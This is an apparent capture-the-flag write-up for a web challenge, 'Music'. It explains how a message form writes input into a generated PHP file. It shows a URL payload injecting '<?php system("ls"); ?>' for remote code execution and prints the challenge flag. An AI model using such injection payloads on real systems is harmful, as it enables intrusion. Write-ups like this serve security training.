# Feb. 9 - Music
> Look at this neat website I found! It's not complete yet, but when it is, it will give you personlized music recommendations like you've never seen before! I think you should check it out. I left a Valentine as a message on the website 😁

## About the Challenge
We have been given a website and we need to find the flag from it (Because of the website is down all the time, i can't provide you any screenshot for this chall)

## How to Solve?
If we check the website, there is a form and if we submit the form there is a new endpoint like this
```
https://music-mhsctf.0xmmalik.repl.co/send.php?message=Test
```
And then 1-2 seconds, we will be redirected to a PHP file that the output of our input. The endpoint will look like this.
```
https://music-mhsctf.0xmmalik.repl.co/message/dzwdu6599.php
```

So, we can doing RCE (Remote Code Execution) by submitting PHP syntax like this

```
https://music-mhsctf.0xmmalik.repl.co/send.php?message=<?php system("ls"); ?>
```
And we will got the flag by checking someone's file :D

```
valentine{n3ver_g0nn4_give_y0u_up}
```